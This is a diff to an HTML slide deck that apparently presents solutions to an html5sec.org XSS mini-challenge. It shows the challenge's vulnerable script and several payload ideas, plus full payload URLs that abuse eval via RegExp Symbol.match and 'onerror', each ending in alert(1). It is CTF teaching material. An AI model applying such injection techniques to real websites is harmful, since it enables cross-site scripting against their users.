@@ -86,19 +86,19 @@ function func(){
 
 
         <section data-transition="fade">
-            <div class="url-part">?xss=x_-+/*?!;:,.@#$%^&*"'<>()[]{}y</div>
+            <div class="url-part">?xss=x_-+/*?!;:,.@#$%^&*"'=<>()[]{}y</div>
             <pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
 onload=onhashchange=func;
 function func(){
     try{
-        x          .             []  y;
+        x          .         =    []  y;
         u=location.hash.slice(1);
         if(u.match(/^https?:\/\/cure53.de\//)) {
             &quot;/&quot;+u.match(/\\/);
             location=u;
         }
     }catch(e){
-        throw x          .             []  y;
+        throw x          .         =    []  y;
     }
 }
 &lt;/script&gt;</code></pre>
@@ -149,14 +149,14 @@ function func(){
 onload=onhashchange=func;
 function func(){
     try{
-        now what;
+         ow what;
         u=location.hash.slice(1);
         if(u.match(/^https?:\/\/cure53.de\//)) {
             &quot;/&quot;+u.match(/\\/);
             location=u;
         }
     }catch(e){
-        throw now what;
+        throw  ow what;
     }
 }
 &lt;/script&gt;</code></pre>
@@ -166,7 +166,7 @@ function func(){
             <h3>Idea 0</h3>
             <p><code>alert<span class="fragment highlight-red" data-fragment-index="1">(</span>1<span class="fragment highlight-red" data-fragment-index="1">)</span></code></p>
             <pre><code>    try{
-        now what;
+         ow what;
         u=location.hash.slice(1);
         if(u.match(/^https?:\/\/cure53.de\//)) {</code></pre>
             <ul>
@@ -179,7 +179,7 @@ function func(){
             <h3>Idea 1</h3>
             <p><code>Stri<span class="fragment highlight-red">n</span>g.prototype.match = alert</code></p>
             <pre><code>    try{
-        now what;
+         ow what;
         u=location.hash.slice(1);
         if(u.match(/^https?:\/\/cure53.de\//)) {</code></pre>
             <ul>
@@ -193,7 +193,7 @@ function func(){
             <h3>Idea 2</h3>
             <p>o<span class="fragment highlight-red">n</span>error = eval; throw 1;</p>
             <pre><code>    try{
-        now what;
+         ow what;
         u=location.hash.slice(1);
         if(u.match(/^https?:\/\/cure53.de\//)) {</code></pre>
             <ul>
@@ -325,7 +325,7 @@ step();
           href="https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#https://cure53.de/=1&#x2028;alert(1)"
           target="_blank"
         >https://html5sec.org/minichallenges/5?xss=RegExp.prototype[Symbol.match]=eval#https://cure53.de/=1&#x2028;alert(1)</a>
-        <div>IE and Edge XSS protection (didn't work for me)</div>
+        <div>IE and Edge XSS protection (didn't work for me on Edge)</div>
         <a
           href="https://html5sec.org/minichallenges/5?xss=slice=alert&quot;++++++++++++++++++++++++++++++hash.slice++++++++++++++++++++++++++="
           target="_blank"
